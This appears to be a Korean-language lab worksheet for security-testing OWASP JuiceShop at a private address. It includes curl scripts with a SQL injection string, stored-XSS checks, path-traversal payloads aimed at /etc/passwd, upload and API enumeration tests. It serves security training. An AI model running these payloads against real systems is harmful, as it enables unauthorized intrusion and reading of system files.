...
- **대상**: http://10.20.40.81:3000 (OWASP JuiceShop)
...
```bash
echo "=== 서버 헤더 ==="
curl -sI http://10.20.40.81:3000 | grep -iE "server|x-powered|x-frame|x-content|content-security|strict-transport|access-control"
echo ""
echo "=== 쿠키 정보 ==="
curl -sI http://10.20.40.81:3000 | grep -i set-cookie || echo '(Set-Cookie 없음)'
echo ""
echo "=== robots.txt ==="
...
# 짧은 비밀번호
result=$(curl -s -X POST http://10.20.40.81:3000/api/Users/ \
...
r_normal=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=apple" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
r_inj=$(curl -s "http://10.20.40.81:3000/rest/products/search?q=apple%27%29%29OR+1=1--" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
...
[ -n "$TOKEN" ] && {
  ...
  stored=$(curl -s http://10.20.40.81:3000/api/Feedbacks/ | grep -c -E "alert\(1\)|<iframe|<script>")
...
result=$(curl -s -X POST http://10.20.40.81:3000/file-upload \
...
for payload in "../etc/passwd" "%2e%2e/etc/passwd" "..%252f..%252fetc/passwd"; do  # 반복문 시작
  result=$(curl -s "http://10.20.40.81:3000/ftp/$payload" | head -1)
...
curl -s http://10.20.40.81:3000/api/Products/abc | python3 -c "
import sys, json
...
for api in "api/Products/1" "api/Feedbacks" "api/Challenges" "api/Users" "api/SecurityQuestions" "rest/admin/application-version"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.40.81:3000/$api")
  size=$(curl -s -o /dev/null -w "%{size_download}" "http://10.20.40.81:3000/$api")
...
echo ""
echo "=== HTTPS / TLS ==="
curl -s -o /dev/null --max-time 3 -w "%{http_code}\n" https://10.20.40.81:3000 2>&1 | head -1 || echo "HTTPS 미지원 (CVSS 5.9 — A02)"
```
...
## 1. 점검 개요
- 점검 대상: http://10.20.40.81:3000 (OWASP JuiceShop)
- 점검 일시: 2026-03-27
- 점검자: (이름)
...
```bash
# 챌린지 목록 조회
curl -s http://10.20.40.81:3000/api/Challenges/ | python3 -c "  # silent 모드
import sys, json
...
1. **점검 대상 확인**: 반드시 `10.20.40.81:3000` (JuiceShop)만 점검할 것
...
8. `http://10.20.40.81:3000/#/score-board` 에서 파일 업로드 관련 챌린지 진행 상황 확인:
   - "Upload Size" 챌린지
   - "Upload Type" 챌린지
